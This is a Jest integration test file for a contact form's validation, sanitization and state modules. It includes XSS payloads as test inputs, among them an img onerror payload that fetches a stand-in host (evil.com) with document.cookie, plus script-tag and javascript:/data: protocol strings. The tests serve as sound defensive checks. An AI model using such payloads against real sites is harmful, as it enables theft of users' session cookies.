/**
 * Contact Form Integration Tests
 * 
 * Tests the full form submission workflow by integrating:
 * - validateForm (validation)
 * - sanitizeFormData (sanitization)
 * - ContactFormState (state management)
 */

import {
  validateName,
  validateEmail,
  validateMessage,
  sanitizeFormData,
  ContactFormState,
  validateForm
} from '../../src/js/modules/contact-form-validation.js';

describe('Contact Form Integration', () => {
  describe('Full Form Submission Workflow', () => {
    let formState;

    beforeEach(() => {
      formState = ContactFormState();
    });

    test('valid form data passes all validations', () => {
      const formData = {
        name: 'John Smith',
        email: 'john@example.com',
        message: 'Hello, I would like to discuss a potential project.'
      };

      const result = validateForm(formData);
      
      expect(result.valid).toBe(true);
      expect(result.errors).toEqual({});
    });

    test('invalid form data returns field errors', () => {
      const formData = {
        name: '',
        email: 'not-an-email',
        message: 'Hi'
      };

      const result = validateForm(formData);
      
      expect(result.valid).toBe(false);
      expect(result.errors.name).toBe('Name is required');
      expect(result.errors.email).toBe('Please enter a valid email address');
      expect(result.errors.message).toBe('Message must be at least 10 characters');
    });

    test('sanitization followed by validation workflow', () => {
      const dirtyData = {
        name: '  <script>alert("xss")</script>John  ',
        email: '  john@example.com  ',
        message: '  <img src=x>Hello, I need help with my project  '
      };

      // Step 1: Sanitize
      const sanitized = sanitizeFormData(dirtyData);
      
      // Step 2: Validate
      const result = validateForm(sanitized);
      
      expect(result.valid).toBe(true);
      expect(sanitized.name).toBe('John');
      expect(sanitized.message).not.toContain('<img');
    });

    test('form state management workflow', () => {
      // Initial state
      expect(formState.getStatus()).toBe('idle');
      
      // User submits form
      formState.setBusy();
      expect(formState.getStatus()).toBe('busy');
      
      // Validation fails
      formState.setValidationErrors({ name: 'Required', email: 'Invalid' });
      expect(formState.isValid()).toBe(false);
      
      // User fixes errors and resubmits
      formState.setBusy();
      expect(formState.getErrors()).toEqual({});
      
      // Submission succeeds
      formState.setSuccess();
      expect(formState.getStatus()).toBe('success');
      
      // Reset for new submission
      formState.reset();
      expect(formState.getStatus()).toBe('idle');
    });

    test('complete happy path workflow', () => {
      const formData = {
        name: 'Jane Doe',
        email: 'jane@company.com',
        message: 'I am interested in hiring you for a web development project.'
      };

      // 1. Sanitize input
      const sanitized = sanitizeFormData(formData);
      
      // 2. Validate
      const validation = validateForm(sanitized);
      
      // 3. Update state
      if (validation.valid) {
        formState.setBusy();
        // Simulate API call success
        formState.setSuccess();
      } else {
        formState.setValidationErrors(validation.errors);
      }

      expect(validation.valid).toBe(true);
      expect(formState.getStatus()).toBe('success');
    });

    test('complete error path workflow', () => {
      const formData = {
        name: '',
        email: 'invalid',
        message: ''
      };

      // 1. Sanitize input
      const sanitized = sanitizeFormData(formData);
      
      // 2. Validate
      const validation = validateForm(sanitized);
      
      // 3. Update state
      if (!validation.valid) {
        formState.setValidationErrors(validation.errors);
      }

      expect(validation.valid).toBe(false);
      expect(formState.isValid()).toBe(false);
      expect(Object.keys(formState.getErrors()).length).toBe(3);
    });
  });

  describe('XSS Prevention in Workflow', () => {
    test('XSS attempts are sanitized before validation', () => {
      const maliciousData = {
        name: '<script>document.cookie</script>',
        email: 'hacker@evil.com',
        message: '<img src=x onerror="fetch(\'http://evil.com?c=\'+document.cookie)">Please help'
      };

      const sanitized = sanitizeFormData(maliciousData);
      
      expect(sanitized.name).not.toContain('<script>');
      expect(sanitized.message).not.toContain('<img');
      expect(sanitized.message).not.toContain('onerror');
    });

    test('javascript protocol in email is rejected', () => {
      const result = validateEmail('javascript:alert(1)');
      expect(result.valid).toBe(false);
    });

    test('data protocol in email is rejected', () => {
      const result = validateEmail('data:text/html,<script>alert(1)</script>');
      expect(result.valid).toBe(false);
    });
  });

  describe('Edge Cases', () => {
    test('handles Unicode characters in name', () => {
      const result = validateName('日本語 名前');
      expect(result.valid).toBe(true);
    });

    test('handles emoji in message', () => {
      const result = validateMessage('Hello! 👋 I would like to work together!');
      expect(result.valid).toBe(true);
    });

    test('handles special characters in email', () => {
      const result = validateEmail('user+tag@example.co.uk');
      expect(result.valid).toBe(true);
    });

    test('handles newlines in message', () => {
      const result = validateMessage(`Hello,

I am interested in your services.

Best regards,
John`);
      expect(result.valid).toBe(true);
    });
  });
});
